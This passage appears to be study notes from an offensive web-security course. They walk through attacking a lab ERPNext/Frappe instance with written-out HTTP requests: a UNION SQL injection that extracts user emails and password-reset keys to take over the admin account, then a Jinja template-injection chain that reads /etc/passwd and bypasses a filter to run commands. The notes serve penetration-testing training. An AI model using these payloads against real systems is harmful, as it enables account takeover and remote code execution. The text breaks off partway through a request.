User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: None
X-Requested-With: XMLHttpRequest
Content-Length: 143
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/
Cookie: user_image=; system_user=yes; user_id=Guest; full_name=Guest; sid=Guest

cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#

```
This returns the response shown in Listing 45.

{"message":[{"route":"Administrator","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"},{"route":"zeljka.k@randomdomain.com","content":"3","relevance":0,"name":"2","title":"4","doctype":"1"}]}
Listing 45 - Extracting the users

Based on the response, the email we used to create the admin user was discovered. This is the account that we will target for the password reset. We can enter the email in the Forgot Password field.


Selecting Send Password will create the password reset token for the user and send an email about the password reset.

Figure 41: Password Reset Complete
Figure 41: Password Reset Complete
Next, we can use the SQL injection to extract the reset key. We know that the reset key is contained in the tabUser table, but we don't know which column yet. To find the column, we will use the query in Listing 46.

SELECT COLUMN_NAME 
FROM information_schema.columns 
WHERE TABLE_NAME = "tabUser";
Listing 46 - Query to discover password reset column

Again, we need to make this conform to the UNION query.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
Listing 47 - Finding table name for password reset

The highlighted part displayed above is the payload that we'll send in Burp via the scope variable.


```
POST / HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: None
X-Requested-With: XMLHttpRequest
Content-Length: 172
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/
Cookie: user_image=; system_user=yes; user_id=Guest; full_name=Guest; sid=Guest

cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT 1,2,3,4,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = "tabUser"#
```

From the list of columns, we notice reset_password_key. We can use this column name to extract the password reset key. We should also include the name column to ensure that we are obtaining the reset key for the correct user. The query for this is:

SELECT name COLLATE utf8mb4_general_ci, reset_password_key COLLATE utf8mb4_general_ci
FROM tabUser;
Listing 49 - Extracting the reset key query

The SQL query in Listing 49 needs to conform to the UNION query. This time, we will use the number "1" for the name/email and number "5" for the reset_password_key. The updated query can be found in Listing 50.

SELECT `doctype`, `name`, `content`, `title`, `route`
  FROM `__global_search`
  WHERE `published` = 1 AND  `route` like "offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#%" AND MATCH(`content`) AGAINST (\'\\"offsec\\"\' IN BOOLEAN MODE)
  LIMIT 20 OFFSET 0'
Listing 50 - Payload for password reset key

Using the highlighted section in Listing 50 as the payload in Burp, we can obtain the password reset key.



```
POST / HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: None
X-Requested-With: XMLHttpRequest
Content-Length: 188
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/
Cookie: user_image=; system_user=yes; user_id=Guest; full_name=Guest; sid=Guest

cmd=frappe.utils.global_search.web_search&text=offsec&scope=offsec_scope" UNION ALL SELECT name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#
```
The Burp response contains the password_reset_key in the "route" string with the email in the "doctype" string

Now that we have the password_reset_key, let's figure out how to use it to reset the password. We will search the application's source code for "reset_password_key" with the idea that wherever this column is used, it will most likely give us a hint on how to use the key.

Searching for "reset_password_key" allows us to discover the reset_password function in the file apps/frappe/frappe/core/doctype/user/user.py. The function can be found below.

	def reset_password(self, send_email=False, password_expired=False):
		from frappe.utils import random_string, get_url

		key = random_string(32)
		self.db_set("reset_password_key", key)

		url = "/update-password?key=" + key
		if password_expired:
			url = "/update-password?key=" + key + '&password_expired=true'

		link = get_url(url)
		if send_email:
			self.password_reset_mail(link)

		return link
Listing 52 - reset_password function

The reset_password function is used to generate the reset_password_key. Once the random key is generated, a link is created and emailed to the user. We can use the format of this link to attempt a password reset. The link we will visit in our example is:

http://erpnext:8000/update-password?key=aAJTVmS14sCpKxrRT8N7ywbnYXRcVEN0
Listing 53 - Password reset link

Visiting this link in our browser provides us with a promising result.

If we type in a new password, we should receive a "Password Updated" message!


1
(database.guide, 2018), https://database.guide/what-is-collation-in-databases/ ↩︎

Attempt to discover how the web_search function is used in the UI. Would it have been possible to discover this kind of vulnerability in a black box assessment?

No, it is not possible since the fields are never displayed in any user viewable content. Whitebox is the only approach that can discover this. While there are sections that use this function, the section that has SQLi is not used by the user accessible endpoints.

How could we use the SQL injection to make the password reset go unnoticed once we have 
system access? 

you could either restore the original pass hash, reset the password or just retrieve the password hash



1
(Pallets Projects, 2020), https://jinja.palletsprojects.com/en/2.11.x/ ↩︎

2
(ERPNext, 2020), https://erpnext.com/docs/user/manual/en/setting-up/email/email-template ↩︎

### SSTI

a common payload used to exploit Jinja

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```
an example of creating classes with inheritance in Python.

>>> class Food:
...     calories = 100
... 
>>> class Fruit(Food):
...     fructose = 2.0
... 
>>> class Strawberry(Fruit):
...     ripeness = "Ripe"
... 
>>> s = Strawberry()
>>> s.calories
100
>>> s.fructose
2.0
>>> s.ripeness
'Ripe'
Listing 57 - Example Inheritance with Strawberry

If we were to access the __mro__ attribute of the Strawberry class, we would discover the resolution order for the class.

>>> Strawberry.__mro__
(<class '__main__.Strawberry'>, <class '__main__.Fruit'>, <class '__main__.Food'>, <class 'object'>)
Listing 58 - __mro__ of Strawberry

Let's go back to our payload and determine the goal of __mro__ in this scenario.

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
Listing 59 - Accessing __mro__ attribute in payload

We'll attempt to get the second index of the tuple returned by the __mro__ attribute in the payload.

>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)

>>> ''.__class__.__mro__[2]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
IndexError: tuple index out of range
Listing 60 - Index out of range from payload

Accessing the second index of the __mro__ attribute returns the error: "tuple index out of range". However, if we were to run this in Python 2.7, we would receive a different result.

kali@kali:~$ python2.7
...
>>> ''.__class__.__mro__
(<type 'str'>, <type 'basestring'>, <type 'object'>)

>>> ''.__class__.__mro__[2]
<type 'object'>
Listing 61 - Using Python2.7 to view __mro__ attribute of empty string

In Python 2.7, the second index of the tuple returned by the __mro__ attribute is the object class. In Python 2.7, the str class inherits from the basestring class while in Python 3, str inherits directly from the object class. This means we will have to be cognizant of the index that we use so that we can get access to the object class.

Now that we understand the __mro__ attribute, let's continue with our payload.

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
Listing 62 - Original payload

Since Python 2.7 is retired, we must retrofit this payload to work with Python 3.0. To accommodate this, we will now begin using "1" as the index in the tuple unless we are referring to the original Python 2.7 payload.

Next, the payload runs the __subclasses__ method within the object class that was returned by the __mro__ attribute. Python defines this attribute as follows:

Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive.7

The __subclasses__ will return all references to the class from which we are calling it. Considering that we will call this from the built-in object class, we should expect to receive a large list of classes.

kali@kali:~$ python3
...
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, ... <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.partialmethod'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'rlcompleter.Completer'>]
Listing 63 - Subclasses of object class

As expected, we will get a complete list of currently-loaded classes that inherit from the object class. The original payload references the 40th index of the list that is returned. In our list, this returns the wrapper_descriptor class.

>>> ''.__class__.__mro__[1].__subclasses__()[40]
<class 'wrapper_descriptor'>
Listing 64 - 40th index of object class in python3

Since the payload is trying to read the /etc/passwd file and the wrapper_descriptor class does not have a read function, we know something is not right.

>>> dir(''.__class__.__mro__[1].__subclasses__()[40])
['__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'copy', 'get', 'items', 'keys', 'values']
Listing 65 - List of attributes and methods of mappingproxy

However, if we use this payload in Python 2.7, the returned item in the 40th index is the file type.

The returned file is a type and not a class - this won't affect how we handle the returned item. Since Python 2.2, a unification of types to classes has been underway.8 In Python 3, types and classes are the same.

kali@kali:~$ python2.7
...
>>> ''.__class__.__mro__[2].__subclasses__()[40]
<type 'file'>

>>> dir(''.__class__.__mro__[2].__subclasses__()[40])
['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
Listing 66 - 40th index of object class in python3

Essentially, the payload is using the file type, passing in the file to be read (/etc/passwd), and running the read method. In Python 2.7, we can read the /etc/passwd file.

>>> ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
'root:x:0:0:root:/root:/usr/bin/fish\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n...\nkali:x:1000:1000:,,,:/home/kali:/bin/bash\n'
Listing 67 - Reading /etc/passwd

We need to find the index of a function in Python 3 that will allow us to accomplish RCE. We'll save the search for that function while we develop a more holistic picture of what's being loaded by Frappe and ERPNext.

1
(Pallets, 2007), https://jinja.palletsprojects.com/en/2.10.x/templates/#length ↩︎

2
(Github, 2019), https://github.com/pallets/jinja/blob/d8820b95d60ecc6a7b3c9e0fc178573e62e2f012/jinja2/filters.py#L1329 ↩︎

3
(Apache, 2020), https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html ↩︎

4
(Python, 2020), https://docs.python.org/3/library/stdtypes.html?highlight=__class__#instance.__class__ ↩︎

5
(Python, 2020), https://docs.python.org/3/library/stdtypes.html?#class.__mro__ ↩︎

6
(Python, 2019), https://wiki.python.org/moin/NewClassVsClassicClass ↩︎

7
(Python, 2020), https://docs.python.org/3/library/stdtypes.html?#class.__subclasses__ ↩︎

8
(Python, 2001), https://www.python.org/dev/peps/pep-0252/ ↩︎


##### Discovering The Rendering Function
We know that ERPNext email templates use the Jinja templating engine, so let's determine if we can find that feature in the application. We will do this by searching for "template" using the search function at the top of the application while logged in as the administrator.

This search leads us to discover the link for "Email Template List", a page that allows users of ERPNext to view and create email templates used throughout the application.


Navigating to the top right and clicking New opens a page to create a new email template.

On the "New Email Template" page, we are required to provide the "Name" and "Subject". Let's enter "Hacking with SSTI" for both entries. In the "Response" textbox, we will provide the basic SSTI testing payload.

 From the email template page, let's select Menu > Email to open a new email page.

From here, we can provide a fake email address (we won't be sending this email) and select the email template that we just created.

With the email template selected, we will find the number "49" in the message field. This means that the SSTI works! But this is a feature of ERPNext, so it doesn't mean we have code execution.

Searching for a request that references the "Hacking with SSTI" subject, we will discover the request in Figure 54 that sends a POST request to the get_email_template function. We can send this request to Repeater to replay it.

```
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: 40d982af267589a752055032bae9b3c93261930c6e99d04e4462a524
X-Frappe-CMD: 
X-Requested-With: XMLHttpRequest
Content-Length: 516
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/desk
Cookie: user_image=; system_user=yes; user_id=Administrator; full_name=Administrator; sid=63a960ebd19d5a6b6a5215c323fae00017887e50991a732fdbfcf809

template_name=Hacking+With+SSTI&doc=%7B%22name%22%3A%22Hacking+With+SSTI%22%2C%22response%22%3A%22%3Cdiv%3E%7B%7B7*7%7D%7D%3C%2Fdiv%3E%22%2C%22modified%22%3A%222024-08-28+16%3A42%3A59.129341%22%2C%22idx%22%3A0%2C%22docstatus%22%3A0%2C%22modified_by%22%3A%22Administrator%22%2C%22owner%22%3A%22Administrator%22%2C%22doctype%22%3A%22Email+Template%22%2C%22subject%22%3A%22Hacking+With+SSTI%22%2C%22creation%22%3A%222024-08-28+16%3A42%3A59.129341%22%2C%22__last_sync_on%22%3A%222024-08-28T20%3A46%3A05.370Z%22%7D&_lang=
```
We will replace the "{{7*7}}" in the template with "{{ ''.__class__ }}" to determine if we can replicate accessing the class of an empty string as we did in the Python console.

```
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: 40d982af267589a752055032bae9b3c93261930c6e99d04e4462a524
X-Frappe-CMD: 
X-Requested-With: XMLHttpRequest
Content-Length: 479
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/desk
Cookie: user_image=; system_user=yes; user_id=Administrator; full_name=Administrator; sid=63a960ebd19d5a6b6a5215c323fae00017887e50991a732fdbfcf809

template_name=Hacking+With+SSTI&doc=%7B%22name%22%3A%22Hacking+With+SSTI%22%2C%22response%22%3A%22%3Cdiv%3E%5C%22%7B%7B+''.__class__+%7D%7D%5C%22%3C%2Fdiv%3E%22%2C%22modified%22%3A%222024-08-28+16%3A50%3A32.486689%22%2C%22idx%22%3A0%2C%22docstatus%22%3A0%2C%22modified_by%22%3A%22Administrator%22%2C%22owner%22%3A%22Administrator%22%2C%22doctype%22%3A%22Email+Template%22%2C%22subject%22%3A%22Hacking+With+SSTI%22%2C%22creation%22%3A%222024-08-28+16%3A42%3A59.129341%22%7D&_lang=
```
The server responds with an "Illegal template" error.

To determine the cause of this issue, let's set a breakpoint on the get_email_template function and follow the code execution. We can search for the string "get_email_template", and discover a function in apps/frappe/frappe/email/doctype/email_template/email_template.py.

14  @frappe.whitelist()
15  def get_email_template(template_name, doc):
16          '''Returns the processed HTML of a email template with the given doc'''
17          if isinstance(doc, string_types):
18                  doc = json.loads(doc)
19
20          email_template = frappe.get_doc("Email Template", template_name)
21          return {"subject" : frappe.render_template(email_template.subject, doc),
22                          "message" : frappe.render_template(email_template.response, doc)}
Listing 68 - Reviewing get_email_template function

Line 14, before the function is defined, tells Frappe that this method is whitelisted and can be executed via an HTTP request. Line 15 defines the function and the two arguments. Line 16 describes that the function "Returns the processed HTML of a email template", which means that we are on the right track. If the doc argument passed to isinstance on Line 17 is a string, the string is deserialized as JSON into a Python object. Line 20 loads the email_template and finally, lines 21-22 render the subject and body of the template.

Suspecting that render_template is throwing the error, we can pause execution by setting a breakpoint on line 22.


Let's run the Burp request again to trigger the breakpoint. Once triggered, we will select the Step Into button to enter the render function for further review. This takes us to the render_template function found in apps/frappe/frappe/utils/jinja.py.

```
53  def render_template(template, context, is_path=None, safe_render=True):
54          '''Render a template using Jinja
55
56          :param template: path or HTML containing the jinja template
57          :param context: dict of properties to pass to the template
58          :param is_path: (optional) assert that the `template` parameter is a path
59          :param safe_render: (optional) prevent server side scripting via jinja templating
60          '''
61
62          from frappe import get_traceback, throw
63          from jinja2 import TemplateError
64
65          if not template:
66                  return ""
67
68          # if it ends with .html then its a freaking path, not html
69          if (is_path
70                  or template.startswith("templates/")
71                  or (template.endswith('.html') and '\n' not in template)):
72                  return get_jenv().get_template(template).render(context)
73          else:
74                  if safe_render and ".__" in template:
75                          throw("Illegal template")
76                  try:
77                          return get_jenv().from_string(template).render(context)
78                  except TemplateError:
79                          throw(title="Jinja Template Error", msg="<pre>{template}</pre><pre>{tb}</pre>".format(template=template, tb=get_traceback()))
```

The render_template function seems to do what we would expect. Examining the if statement on lines 74-75, it seems that the developers have thought about the SSTI issue and attempted to curb any issues by filtering the ".__" characters.

Our next goal is to hit line 77 where get_jenv is used to render the template that is provided by user input. This makes executing the SSTI more difficult since the payload requires ".__" to navigate to the object class.

Jinja offers one interesting feature called filters.2 An example of a filter is the attr() function,3 which is designed to "get an attribute of an object". Listing 70 shows a trivial use case.

{% set foo = "foo" %}
{% set bar = "bar" %}
{% set foo.bar = "Just another variable" %}
{{ foo|attr(bar) }}
Listing 70 - Example of attr filter

The output of this example would be: "Just another variable".

As mentioned earlier, while Jinja is built on Python and shares much of its functionality, the syntax is different. So while the filter is expecting the attribute to be accessed with a period followed by two underscores, we could rewrite the payload to use Jinja's syntax, making the "." unnecessary.

First, let's build the template to give us access to the attributes we will need to exploit the SSTI. We know that we will need a string, the __class__ attribute, the __mro__ attribute, and the __subclasses__ attribute.

{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
Listing 71 - Configuring String and Attributes

The string variable will replace the two single quotes ('') in the original payload. The rest of the values are the various attributes from the SSTI payload.

Now we can start building the SSTI payload string in the email template builder under the defined variables. First, let's attempt to get the __class__ attribute of the string variable using the expression "string|attr(class)".

With the template configured, let's render it and extract the classes of the string. If the SSTI works, we will receive a "<class 'str'>" response.

```
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: 40d982af267589a752055032bae9b3c93261930c6e99d04e4462a524
X-Frappe-CMD: 
X-Requested-With: XMLHttpRequest
Content-Length: 797
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/desk
Cookie: user_image=; system_user=yes; user_id=Administrator; full_name=Administrator; sid=63a960ebd19d5a6b6a5215c323fae00017887e50991a732fdbfcf809

template_name=Hacking+With+SSTI&doc=%7B%22name%22%3A%22Hacking+With+SSTI%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%5C%22%7B%7B+string%7Cattr(class)%7D%7D%5C%22%3C%2Fdiv%3E%22%2C%22modified%22%3A%222024-08-28+17%3A20%3A48.372268%22%2C%22idx%22%3A0%2C%22docstatus%22%3A0%2C%22modified_by%22%3A%22Administrator%22%2C%22owner%22%3A%22Administrator%22%2C%22doctype%22%3A%22Email+Template%22%2C%22subject%22%3A%22Hacking+With+SSTI%22%2C%22creation%22%3A%222024-08-28+16%3A42%3A59.129341%22%7D&_lang=

```

Now that we have confirmed the bypass for the SSTI filtering is working, we can begin exploitation to obtain RCE.


1
(Pallets Projects, 2020), https://jinja.palletsprojects.com/en/2.11.x/templates/ ↩︎

2
(Pallets, 2007), https://jinja.palletsprojects.com/en/2.10.x/templates/#filters ↩︎

3
(Pallets, 2007), https://jinja.palletsprojects.com/en/2.10.x/templates/#attr ↩︎




possible soln for extra mile?
```
https://0day.work/jinja2-template-injection-filter-bypasses/
```

```
{% set string = "ssti" %}
{% set class = "\x5f\x5fclass\x5f\x5f" %}
{% set mro = "\x5f\x5fmro\x5f\x5f" %}
{% set subclasses = "\x5f\x5fsubclasses\x5f\x5f" %}
{% set mro_r = string|attr(class)|attr(mro) %}
{{ mro_r[1] }}
```

```
{{ string|attr(["","class",""]|join)|attr(["","mro",""]|join) }}. not sure about the "only string|attr(class)"
```


```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set bases = "__bases__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
{% set init = ["_"*2,"init","_"*2]|join %}
{% set globals = ["_"*2,"globals","_"*2]|join %}
{% set oj = string|attr(class)|attr(mro) %}
{% set oj_subclasses = oj[1]|attr(subclasses)() %}
{% set oj_rce = oj_subclasses[60]%}
{{ oj_rce(["touch", "/tmp/tyler"])}} 
```
```
{% set string = "string" %}
{% set class = ["_"*2, "class", "_"*2]|join %} 
{{ string|attr(class) }}
```

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#accessing-global-objects
https://blog.finxter.com/python-one-line-reverse-shell/

#### SSTI Vulnerability Exploitation

##### Finding a Method for Remote Command Execution

Let's quickly review the SSTI payload that we are modeling.

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
Listing 72 - Accessing __mro__ attribute in payload

To discover what objects are available to us, we can use mro to obtain the object class and then list all subclasses. First, let's set the last line of the email template to "{{ string|attr(class)|attr(mro) }}" to list the mro of the str class.


```
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: 40d982af267589a752055032bae9b3c93261930c6e99d04e4462a524
X-Frappe-CMD: 
X-Requested-With: XMLHttpRequest
Content-Length: 798
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/desk
Cookie: user_image=; system_user=yes; user_id=Administrator; full_name=Administrator; sid=63a960ebd19d5a6b6a5215c323fae00017887e50991a732fdbfcf809

template_name=Hacking+With+SSTI&doc=%7B%22modified_by%22%3A%22Administrator%22%2C%22owner%22%3A%22Administrator%22%2C%22name%22%3A%22Hacking+With+SSTI%22%2C%22modified%22%3A%222024-08-28+19%3A49%3A38.652382%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+string%7Cattr(class)%7Cattr(mro)+%7D%7D%3C%2Fdiv%3E%22%2C%22idx%22%3A0%2C%22subject%22%3A%22Hacking+With+SSTI%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22creation%22%3A%222024-08-28+16%3A42%3A59.129341%22%7D&_lang=
```
We should receive a response with two classes: one for the str class and the other for the object class. Since we want the object class, let's access index "1". The value of the email template should be the one found in Listing 73.

{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{{ string|attr(class)|attr(mro)[1] }}
Listing 73 - Accessing index 1 from mro attribute

If we attempt to save the template, we'll receive an error that it is invalid.

Jinja syntax does not work with "[" characters after a filter. Instead, let's save the response from the mro attribute as a variable and access index "1" after the variable is set.

To do this, we need to change the double curly braces ("{{" and "}}") that are used for expressions in Jinja to a curly brace followed by a percentage sign ("{%" and "%}"), which is used for statements. We also need to set a variable using the "set" tag and provide a variable name (let's use mro_r for mro response). Finally, we need to make a new expression to access index "1".

The final payload can be found in Listing 74.

{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{{ mro_r[1] }}
Listing 74 - Setting mro_r variable to mro response


Rendering this template allows us to extract only the object class.


```
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: 40d982af267589a752055032bae9b3c93261930c6e99d04e4462a524
X-Frappe-CMD: 
X-Requested-With: XMLHttpRequest
Content-Length: 859
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/desk
Cookie: user_image=; system_user=yes; user_id=Administrator; full_name=Administrator; sid=63a960ebd19d5a6b6a5215c323fae00017887e50991a732fdbfcf809

template_name=Hacking+With+SSTI&doc=%7B%22modified_by%22%3A%22Administrator%22%2C%22owner%22%3A%22Administrator%22%2C%22name%22%3A%22Hacking+With+SSTI%22%2C%22modified%22%3A%222024-08-28+19%3A51%3A58.831729%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+mro_r%5B1%5D+%7D%7D%3C%2Fdiv%3E%22%2C%22idx%22%3A0%2C%22subject%22%3A%22Hacking+With+SSTI%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22creation%22%3A%222024-08-28+16%3A42%3A59.129341%22%7D&_lang=
```
In the next section of the payload, we need to list all subclasses using the __subclasses__ method. We also need to execute the method using "()" after the attribute is accessed. Notice that we will quickly run into the same issue we ran into earlier when we need to access an index from the response while running the __subclasses__ method.

To fix this issue, we can again transform the expression into a statement and save the output of the __subclasses__ method into a variable. The payload for this is shown in Listing 75.

{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r }}
Listing 75 - Accessing the __subclasses__ attribute and executing

Rendering the template executes the __subclasses__ method and returns a long list of classes that are available to us. We will need to carefully review this list to find classes that could result in code execution.

```
POST /api/method/frappe.email.doctype.email_template.email_template.get_email_template HTTP/1.1
Host: erpnext:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
